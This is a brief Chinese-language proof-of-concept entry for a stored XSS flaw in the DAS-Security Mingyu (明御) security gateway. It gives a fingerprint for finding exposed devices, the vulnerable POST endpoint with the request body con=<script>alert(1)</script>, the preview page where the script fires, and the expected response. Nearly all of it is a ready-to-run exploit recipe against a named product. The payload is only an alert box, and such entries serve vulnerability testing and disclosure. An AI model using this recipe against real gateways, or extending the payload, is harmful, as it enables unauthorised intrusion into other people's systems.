# 安恒安全网关aaa_local_web_custom_auth_html存储型xss漏洞

安恒安全网关aaa_local_web_custom_auth_html存储型 ｜ XSS ｜ —
- **指纹**：`title="明御安全网关"`
- **请求**：`POST /webui/?g=aaa_local_web_custom_auth_html HTTP/1.1`

**Payload**
```
上传xss文件
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
con=<script>alert(1)</script>
访问得到结果
[https://x.x.x.x/auth/preview_2.html](https://x.x.x.x/auth/preview_2.html)
```
- **响应特征**：200 alert(1)